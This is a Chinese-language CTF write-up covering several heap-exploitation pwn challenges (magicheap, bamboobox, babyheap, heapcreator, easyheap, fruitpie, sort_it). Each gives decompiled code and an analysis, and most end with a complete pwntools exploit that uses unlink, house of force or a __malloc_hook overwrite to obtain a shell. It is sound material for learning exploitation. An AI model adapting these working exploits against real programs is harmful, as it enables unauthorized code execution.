# Challenges 100 Week 8


# Challenges_100-Week_8

|          Challenges          |               Tricks                |
| :--------------------------: | :---------------------------------: |
| BUU-hitcontraining-magicheap |        `unsortedbin attack`         |
| BUU-hitcontraining_bamboobax |      `unlink`/`house_of_force`      |
|    BUU-0ctf_2017_babyheap    | `heap overflow`+``house_of_spirit`` |
|       BUU-heapcreator        |            `off-by-one`             |
|   BUU-[ZJCTF2019]easyheap    |              `unlink`               |
|     安恒三月赛-fruitpie      |            `mmap attack`            |
|   NahamconCTF-2021-sort_it   |          `数组超界`+`ROP`           |

<!--more-->

# BUU-hitcontraining-magicheap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**create**

```c
unsigned __int64 create_heap()
{
  int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*(&heaparray + i) )
    {
      printf("Size of Heap : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      *(&heaparray + i) = malloc(size);
      if ( !*(&heaparray + i) )
      {
        puts("Allocate Error");
        exit(2);
      }
      printf("Content of heap:");
      read_input(*(&heaparray + i), size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

**edit**

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+4h] [rbp-1Ch]
  __int64 v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Size of Heap : ");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    printf("Content of heap : ");
    read_input(*(&heaparray + v1), v2);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

**delete**

```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    free(*(&heaparray + v1));
    *(&heaparray + v1) = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

跟ZJCTF2019一样的题目不过将后门改成了`get shell`，可以进行利用了。这里只要向`magic`写一个大数就好，所以想到使用`unsortedbin attack`。改了改脚本直接打。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, addr))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./magicheap'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',29693)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
system_plt = elf.plt["system"]
free_got = elf.got["free"]

def add(size,content):
    sh.sendline("1")
    sh.sendafter('Size of Heap : ', str(size))
    sh.sendafter('Content of heap:', str(content))
    
def edit(index, size, content):    
    sh.sendline("2")
    sh.sendafter("Index :", str(index))
    sh.sendafter('Size of Heap : ', str(size))
    sh.sendafter('Content of heap : ', str(content))
    
def free(index):
    sh.sendline("3")
    sh.sendafter("Index :", str(index))      
    
heap_arry = 0x6020C0-8
magic = 0x6020A0

add(0x80,'a'*0x80) #0
add(0x80,'b'*0x80) #1
add(0x10,"/bin/sh\x00\x00\x00")   #2
free(1)
payload = ''
payload=payload.ljust(0x80,'a')
payload+=p64(0)+p64(0x91)+p64(magic)+p64(magic-0x10)
edit(0, 0x110, payload)
add(0x80,'c'*0x80)
#gdb.attach(sh)

sh.sendline('4869')
sh.interactive()
```

# BUU-hitcontraining_bamboobax

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**show**

```c
int show_item()
{
  int i; // [rsp+Ch] [rbp-4h]

  if ( !num )
    return puts("No item in the box");
  for ( i = 0; i <= 99; ++i )
  {
    if ( *((_QWORD *)&unk_6020C8 + 2 * i) )
      printf("%d : %s", (unsigned int)i, *((const char **)&unk_6020C8 + 2 * i));
  }
  return puts(byte_401089);
}
```

**add**

```c
__int64 add_item()
{
  int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the box is full");
  }
  else
  {
    printf("Please enter the length of item name:");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    if ( !v2 )
    {
      puts("invaild length");
      return 0LL;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !*((_QWORD *)&unk_6020C8 + 2 * i) )
      {
        *((_DWORD *)&itemlist + 4 * i) = v2;
        *((_QWORD *)&unk_6020C8 + 2 * i) = malloc(v2);
        printf("Please enter the name of item:");
        *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * i) + (int)read(0, *((void **)&unk_6020C8 + 2 * i), v2)) = 0;
        ++num;
        return 0LL;
      }
    }
  }
  return 0LL;
}
```

**edit**

```c
unsigned __int64 change_item()
{
  int v1; // [rsp+4h] [rbp-2Ch]
  int v2; // [rsp+8h] [rbp-28h]
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      printf("Please enter the length of item name:");
      read(0, nptr, 8uLL);
      v2 = atoi(nptr);
      printf("Please enter the new name of the item:");
      *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

**delete**

```c
unsigned __int64 remove_item()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      free(*((void **)&unk_6020C8 + 2 * v1));
      *((_QWORD *)&unk_6020C8 + 2 * v1) = 0LL;
      *((_DWORD *)&itemlist + 4 * v1) = 0;
      puts("remove successful!!");
      --num;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

在`edit`有溢出，有一个管理堆块的数组，首先想到`unlink`。

这里还有一种方法，利用`house_of_force`。在开始申请了一个0x10的chunk，用来放`hello_messsage`和`goodbye_message`函数的地址，我们通过`house_of_force`将`top chunk`迁移到这个chunk附近，从而修改其中的内容。但是由于buu不提供题目靶机环境复现，所以这种方法只能用来练习。

## exp

**unlink**

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./bamboobox'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27159)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

def show():
    sh.sendline("1")

def add(size,content):
    sh.sendline("2")
    sh.sendafter("Please enter the length of item name:",str(size))
    sh.sendafter('Please enter the name of item:',str(content))

def edit(index, size, content):
    sh.sendline("3")
    sh.sendlineafter('Please enter the index of item:',str(index))
    sh.sendafter('Please enter the length of item name:',str(size))
    sh.sendafter('Please enter the new name of the item:',str(content))
    
def free(index):
    sh.sendline('4')
    sh.sendlineafter('Please enter the index of item:',str(index))

array = 0x6020C8
atoi_got = elf.got['atoi']

add(0x40,'a'*0x40) #0
add(0x80,'b'*0x80) #1
add(0x40,'c'*0x40) #2
add(0x10,'/bin/sh\x00\x00\x00')	#4
#gdb.attach(sh)
payload = p64(0)+p64(0x41)+p64(array-0x18)+p64(array-0x10)
payload=payload.ljust(0x40,'n')
payload+=p64(0x40)+p64(0x90)
edit(0,0x80,payload)
#gdb.attach(sh)
free(1)    
payload = p64(0x40)*3+p64(atoi_got)
edit(0,0x80,payload)
show()

atoi_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
leak('atoi',atoi_addr)
libc = LibcSearcher('atoi',atoi_addr)
libcbase = atoi_addr-libc.dump('atoi')
system = libcbase+libc.dump('system')
edit(0,0x80,p64(system))
sh.sendline('/bin/sh\x00')

sh.interactive()
```

**house_of_force**

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=1
binary='./bamboobox'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27159)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

def show():
    sh.sendline("1")

def add(size,content):
    sh.sendline("2")
    sh.sendafter("Please enter the length of item name:",str(size))
    sh.sendafter('Please enter the name of item:',str(content))

def edit(index, size, content):
    sh.sendline("3")
    sh.sendlineafter('Please enter the index of item:',str(index))
    sh.sendafter('Please enter the length of item name:',str(size))
    sh.sendafter('Please enter the new name of the item:',str(content))
    
def free(index):
    sh.sendline('4')
    sh.sendlineafter('Please enter the index of item:',str(index))

array = 0x6020C8
magic = 0x400D49
atoi_got = elf.got['atoi']

add(0x30,'a'*0x30) #0

payload='a'*0x30+p64(0)+'\xff'*8
edit(0,0x80,payload)

offset = -(0x60+0x8+0xf)
#gdb.attach(sh)
add(offset,'a\n')#1
add(0x10,'a\n')
edit(2,0x10,p64(magic)*2)
sh.sendline('5')

sh.interactive()
```

# BUU-0ctf_2017_babyheap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**create**

```c
void __fastcall sub_D48(__int64 a1)
{
  int i; // [rsp+10h] [rbp-10h]
  int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = sub_138C();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

**fill**

```c
__int64 __fastcall sub_E7F(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (int)result >= 0 && (int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = sub_138C();
      v3 = result;
      if ( (int)result > 0 )
      {
        printf("Content: ");
        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

**free**

```c
__int64 __fastcall sub_F50(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (int)result >= 0 && (int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      *(_DWORD *)(24LL * v2 + a1) = 0;
      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;
      free(*(void **)(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
  return result;
}
```

**dump**

```c
int __fastcall sub_1051(__int64 a1)
{
  int result; // eax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
      result = puts(byte_14F1);
    }
  }
  return result;
}
```

在`fill`中存在溢出，可以通过`overlapping`泄露libc，再`house_of_spirit`修改`__malloc_hook`。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./0ctf_2017_babyheap'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',29355)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

def add(size):
    sh.sendlineafter("Command: ","1")
    sh.sendlineafter("Size: ",str(size))
    
def fill(index, size, content):
    sh.sendlineafter("Command: ","2")
    sh.sendlineafter("Index: ",str(index))
    sh.sendlineafter("Size: ",str(size))
    sh.sendlineafter("Content: ",str(content))
    
def free(index):
    sh.sendlineafter("Command: ","3")
    sh.sendlineafter("Index: ",str(index))
    
def show(index):
    sh.sendlineafter("Command: ","4")
    sh.sendlineafter("Index: ",str(index))


#gdb.attach(sh)

add(0x10)  #0
add(0x80)  #1
add(0x100)  #2
add(0x10)  #3


payload = '\x00'*0x10+p64(0)+p64(0x1a1)
fill(0,len(payload),payload)
#gdb.attach(sh)
free(1)
add(0x190) #1
payload = '\x00'*0x80+p64(0)+p64(0x111)
fill(1,len(payload),payload)
free(2)
show(1)

main_arena = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
malloc_hook = main_arena -88 - 0x10
fake_chunk = malloc_hook -0x23
libc_base=main_arena-88-0x3C4B20
one_gadget = libc_base + 0x4526a

leak('main_arena', main_arena)
leak('malloc_hook',malloc_hook)
leak('fake_chunk', fake_chunk)
leak('libc_base', libc_base)

add(0x100) #2

add(0x60) #4
add(0x60) #5

free(4)
payload = p64(0)*3+p64(0x71)+p64(fake_chunk)
fill(3,len(payload),payload)
add(0x60) #4
add(0x60) #6
payload = 'a'*0x13+p64(one_gadget)
fill(6,len(payload),payload)
add(0x10) #7

sh.interactive()
```

# BUU-heapcreator

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**create**

```c
unsigned __int64 create_heap()
{
  __int64 v0; // rbx
  int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  char buf[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*(&heaparray + i) )
    {
      *(&heaparray + i) = malloc(0x10uLL);
      if ( !*(&heaparray + i) )
      {
        puts("Allocate Error");
        exit(1);
      }
      printf("Size of Heap : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      v0 = (__int64)*(&heaparray + i);
      *(_QWORD *)(v0 + 8) = malloc(size);
      if ( !*((_QWORD *)*(&heaparray + i) + 1) )
      {
        puts("Allocate Error");
        exit(2);
      }
      *(_QWORD *)*(&heaparray + i) = size;
      printf("Content of heap:");
      read_input(*((_QWORD *)*(&heaparray + i) + 1), size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

**edit**

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Content of heap : ");
    read_input(*((_QWORD *)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

**show**

```c
unsigned __int64 show_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Size : %ld\nContent : %s\n", *(_QWORD *)*(&heaparray + v1), *((const char **)*(&heaparray + v1) + 1));
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

**delete**

```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    free(*((void **)*(&heaparray + v1) + 1));
    free(*(&heaparray + v1));
    *(&heaparray + v1) = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

`crearte`时，申请一个0x10的控制chunk，存放申请chunk的size和地址。

在`edit`中有一个`off-by-one`，可以利用用来修改控制chunk，向其size写一个较大的值，`free`掉。被我们修改的控制chunk包含了正在使用的chunk。且用户申请的chunk在控制chunk的上面，可以覆盖其内容。通过修改chunk指针，leak libc并修改got表。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, addr))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./heapcreator'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27001)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

free_got = elf.got['free']

def add(size, content):
    sh.sendline("1")
    sh.sendafter("Size of Heap : ", str(size))
    sh.sendafter("Content of heap:", str(content))

def edit(index, content):
    sh.sendline("2")
    sh.sendafter("Index :",str(index))
    sh.sendafter("Content of heap : ", str(content))
    
def show(index):
    sh.sendline("3")
    sh.sendafter("Index :",str(index))
    
def free(index):
    sh.sendline("4")
    sh.sendafter("Index :",str(index))   

add(0x18,'a'*0x18) #0
add(0x10,'b'*0x10) #1
add(0x10,'c'*0x10) #2
add(0x10,'b'*0x10) #3

#gdb.attach(sh)
edit(0, '/bin/sh\x00'*3+'\x81')
free(1)
add(0x70, p64(0)*8+p64(0x8)+p64(free_got)) #1
show(2)
free_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
leak('free',hex(free_addr))
libc = LibcSearcher("free", free_addr)
libcbase = free_addr - libc.dump("free")
system = libcbase + libc.dump('system')
#gdb.attach(sh)
edit(2,p64(system))
free(0)

sh.interactive()
```

# BUU-[ZJCTF2019]easyheap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**create**

```c
unsigned __int64 create_heap()
{
  int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*(&heaparray + i) )
    {
      printf("Size of Heap : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      *(&heaparray + i) = malloc(size);
      if ( !*(&heaparray + i) )
      {
        puts("Allocate Error");
        exit(2);
      }
      printf("Content of heap:");
      read_input(*(&heaparray + i), size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

**edit**

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+4h] [rbp-1Ch]
  __int64 v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Size of Heap : ");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    printf("Content of heap : ");
    read_input(*(&heaparray + v1), v2);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

**delete**

```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    free(*(&heaparray + v1));
    *(&heaparray + v1) = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

使用`heaparray`维护了一个堆指针数组，在`edit_heap`中可以写任意字节，有溢出。`delete`时，将指针进行了销毁，没有UAF。

想到使用`unlink`改写数组指针。由于BUU环境与原题不一样所有没办法使用`magic`直接打印flag，使用修改got表的方法。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, addr))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./easyheap'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',29537)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
system_plt = elf.plt["system"]
free_got = elf.got["free"]

def add(size,content):
    sh.sendline("1")
    sh.sendafter('Size of Heap : ', str(size))
    sh.sendafter('Content of heap:', str(content))
    
def edit(index, size, content):    
    sh.sendline("2")
    sh.sendafter("Index :", str(index))
    sh.sendafter('Size of Heap : ', str(size))
    sh.sendafter('Content of heap : ', str(content))
    
def free(index):
    sh.sendline("3")
    sh.sendafter("Index :", str(index))      
    
heap_arry = 0x6020E0
magic = 0x6020C0

add(0x100,'a'*0x100) #0
add(0x100,'b'*0x100) #1
add(0x10,"/bin/sh\x00\x00\x00")   #2

payload = p64(0)+p64(0x100)+p64(heap_arry-0x18)+p64(heap_arry-0x10)
payload=payload.ljust(0x100,'a')
payload+=p64(0x100)+p64(0x110)
edit(0, 0x110, payload)
free(1)
#gdb.attach(sh)
payload = p64(0)+p64(free_got)+p64(free_got)+p64(free_got)
edit(0,len(payload),payload)
payload= p64(system_plt)+p64(system_plt)
edit(0,len(payload),payload)

free(2)
#add(0x10,'c'*0x10)
sh.interactive()
```

# 安恒三月赛

# fruitpie

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD size[3]; // [rsp+4h] [rbp-1Ch] BYREF
  char *v5; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  welcome();
  puts("Enter the size to malloc:");
  size[0] = readInt();
  v5 = (char *)malloc(size[0]);
  if ( !v5 )
  {
    puts("Malloc Error");
    exit(0);
  }
  printf("%p\n", v5);
  puts("Offset:");
  _isoc99_scanf("%llx", &size[1]);
  puts("Data:");
  read(0, &v5[*(_QWORD *)&size[1]], 0x10uLL);
  malloc(0xA0uLL);
  close(1);
  return 0;
}
```

可以申请任意大小的内存，之后chunk为基准可以向任意偏移地址写0x10字节。
思路是，申请一个很大的chunk，让其通过`mmap`进行分配，以此计算libcbase。再通过向`__malloc_hook`写`one gadget`获得权限。使用`one_gadget`栈需要满足一定的条件，所以通过将`__malloc_hook`覆盖为`realloc`进行调栈。

```c
malloc ---> __malloc_hook ---> realloc ---> __realloc_hook ---> one_gadget 
```

查看`realloc`的汇编代码:

```assembly
.text:0000000000098CA0 ; __unwind {
.text:0000000000098CA0                 push    r15             ; Alternative name is '__libc_realloc'
.text:0000000000098CA2                 push    r14
.text:0000000000098CA4                 push    r13
.text:0000000000098CA6                 push    r12
.text:0000000000098CA8                 push    rbp
.text:0000000000098CA9                 push    rbx
.text:0000000000098CAA                 sub     rsp, 18h
.text:0000000000098CAE                 mov     rax, cs:__realloc_hook_ptr
.text:0000000000098CB5                 mov     rax, [rax]
.text:0000000000098CB8                 test    rax, rax
.text:0000000000098CBB                 jnz     loc_98F50
.text:0000000000098CC1                 test    rsi, rsi
```

发现其有很多push，我们就通过这些指令来调节栈帧。

## exp

```python 
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, addr))
context.log_level="DEBUG"
context.arch="amd64"

local=1
binary='./pwn'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27982)

elf = ELF(binary,checksec=False)
libc = ELF('./libc.so.6')

one_gadget=[0x4f365,0x4f3c2,0x10a45c]


sh.sendafter('Enter the size to malloc:', str(99999999))
sh.recvuntil('0x')
addr = int(sh.recv(12),16)
leak('chunk',hex(addr))

libc_base=addr+0x5f5eff0
leak('libc base',hex(libc_base))

one=libc_base+one_gadget[1]
realloc=libc_base+libc.sym['realloc']
#gdb.attach(sh)
offset=libc.sym["__malloc_hook"]+0x5f5eff0
leak('offset',hex(offset))

sh.sendlineafter('Offset:',hex(offset))
sh.sendafter('Data:',p64(one)+p64(realloc+0x4))

sh.interactive()
```

学习到通过`mmap`的内存来泄露libc，通过`realloc`进行调栈。

# sort_it

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // rdi
  __int64 v4; // rdx
  __int64 v5; // rsi
  __int64 v6; // rdx
  char v8; // [rsp+Fh] [rbp-71h]
  __int64 v9; // [rsp+10h] [rbp-70h] BYREF
  __int64 v10; // [rsp+18h] [rbp-68h] BYREF
  __int64 v11[12]; // [rsp+20h] [rbp-60h] BYREF

  v11[11] = __readfsqword(0x28u);
  v8 = 0;
  v11[0] = 'egnaro';
  v11[1] = 'eton';
  v11[2] = 'elppa';
  v11[3] = 'puc';
  v11[4] = 'daerb';
  v11[5] = 'arbez';
  v11[6] = 'dnah';
  v11[7] = 'naf';
  v11[8] = 'noil';
  v11[9] = 'licnep';
  clear(argc, argv, envp);
  puts("Sort the following words in alphabetical order.\n");
  print_words(v11);
  v3 = "Press any key to continue...";
  printf("Press any key to continue...");
  getchar();
  while ( v8 != 1 )
  {
    clear(v3, argv, v4);
    print_words(v11);
    printf("Enter the number for the word you want to select: ");
    __isoc99_scanf("%llu", &v9);
    getchar();
    --v9;
    printf("Enter the number for the word you want to replace it with: ");
    __isoc99_scanf("%llu", &v10);
    getchar();
    --v10;
    v5 = v9;
    swap(v11, v9, v10);
    clear(v11, v5, v6);
    print_words(v11);
    printf("Are the words sorted? [y/n]: ");
    argv = (const char **)(&word_10 + 1);
    v3 = &yn;
    fgets(&yn, 0x11, stdin);
    if ( yn != 'n' )
    {
      if ( yn != 'y' )
      {
        puts("Invalid choice");
        getchar();
        exit(0);
      }
      v8 = 1;
    }
  }
  if ( (unsigned int)check((__int64)v11) )
  {
    puts("You lose!");
    exit(0);
  }
  puts("You win!!!!!");
  return 0;
}
```

对数组中的元素进行排序，可以交换任意两个元素，这里存在明显的数组超界。通过数组超界泄露代码段基址，libc基址和栈地址。

